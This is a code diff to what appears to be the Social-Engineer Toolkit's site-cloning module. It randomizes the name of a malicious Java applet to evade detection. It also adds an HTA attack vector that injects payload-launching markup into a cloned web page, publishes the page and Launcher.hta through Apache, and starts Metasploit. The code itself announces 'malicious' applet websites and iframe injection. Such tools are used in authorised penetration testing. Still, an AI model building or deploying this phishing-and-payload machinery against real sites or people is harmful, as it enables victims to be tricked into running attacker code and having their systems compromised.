@@ -15,14 +15,16 @@ import urllib2
 operating_system = check_os()
 definepath=os.getcwd()
 
-from config.set_config import USER_AGENT_STRING as user_agent
-from config.set_config import WEB_PORT as web_port
-from config.set_config import JAVA_ID_PARAM as java_id
-from config.set_config import JAVA_REPEATER as java_repeater  #Boolean
-from config.set_config import JAVA_TIME as java_time
-from config.set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
-from config.set_config import AUTO_REDIRECT as auto_redirect  #Boolean
-from config.set_config import UNC_EMBED as unc_embed          #Boolean
+sys.path.append("/etc/setoolkit")
+from set_config import USER_AGENT_STRING as user_agent
+from set_config import WEB_PORT as web_port
+from set_config import JAVA_ID_PARAM as java_id
+from set_config import JAVA_REPEATER as java_repeater  #Boolean
+from set_config import JAVA_TIME as java_time
+from set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
+from set_config import AUTO_REDIRECT as auto_redirect  #Boolean
+from set_config import UNC_EMBED as unc_embed          #Boolean
+sys.path.append(definepath)
 
 track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 
@@ -93,6 +95,10 @@ rand_gen_win = generate_random_string(6, 15)
 rand_gen_mac = generate_random_string(6, 15)
 # nix elf binary random name
 rand_gen_nix = generate_random_string(6, 15)
+# randomize name for java applet
+rand_gen_applet = generate_random_string(6, 15) + ".jar"
+# update the SET options
+update_options("APPLET_NAME=" + rand_gen_applet)
 
 try:
     ## open our config file that was specified in SET
@@ -132,7 +138,7 @@ try:
                 wget = 1
 
             if wget == 1:
-                subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (proxy_config,setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
             if wget == 0:
                 # if we don't have wget installed we will use python to rip, not as good as wget
@@ -246,6 +252,7 @@ try:
             applet_database = applet_database.replace("msf.exe", rand_gen_win)
             applet_database = applet_database.replace("mac.bin", rand_gen_mac)
             applet_database = applet_database.replace("nix.bin", rand_gen_nix)
+	    applet_database = applet_database.replace("RANDOMIZE1", rand_gen_applet)
             update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))
 
             ## close the file up
@@ -318,6 +325,25 @@ try:
 
             print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC
 
+	## if we are using HTA attack
+	if check_options("ATTACK_VECTOR") == "HTA":
+		# </body>
+		if os.path.isfile(setdir + "/Launcher.hta"):
+			data1 = file(setdir + "/web_clone/index.html", "r").read()
+			data2 = file(setdir + "/hta_index", "r").read()
+			data3 = data1.replace("</body>", data2 + "</body>")
+			filewrite = file(setdir + "/web_clone/index.html", "w")
+			filewrite.write(data3)
+			filewrite.close()
+			print_status("Copying over files to Apache server...")
+			apache_dir = check_config("APACHE_DIRECTORY=")
+			if os.path.isdir(apache_dir + "/html"): apache_dir = apache_dir + "/html"
+			shutil.copyfile(setdir + "/web_clone/index.html", apache_dir + "/index.html")
+			shutil.copyfile(setdir + "/Launcher.hta", apache_dir + "/Launcher.hta")
+
+			print_status("Launching Metapsloit.. Please wait one.")
+			subprocess.Popen("%smsfconsole -r %s/meta_config" % (meta_path(), setdir), shell=True).wait()
+
         ## selection of browser exploits
         ## check to see if multiattack is in use
         multi_meta="off"
@@ -342,9 +368,9 @@ try:
             for line in fileopen:
                 counter=0
                 if attack_vector == "browser":
-                    match=re.search("Signed_Update.jar", line)
+                    match=re.search(rand_gen_applet, line)
                     if match:
-                        line=line.replace("Signed_Update.jar", "invalid.jar")
+                        line=line.replace(rand_gen_applet, "invalid.jar")
                         filewrite.write(line)
                         counter=1
 
@@ -368,8 +394,8 @@ try:
             print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC
 
         if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
-            if not os.path.isfile(setdir + "/web_clone/Signed_Update.jar"):
-                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/Signed_Update.jar")
+            if not os.path.isfile(setdir + "/web_clone/%s" % (rand_gen_applet)):
+                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/%s" % (rand_gen_applet))
             ## move index.html to our main website
             if os.path.isfile(setdir + "/web_clone/index.html.new"):
                 shutil.move(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
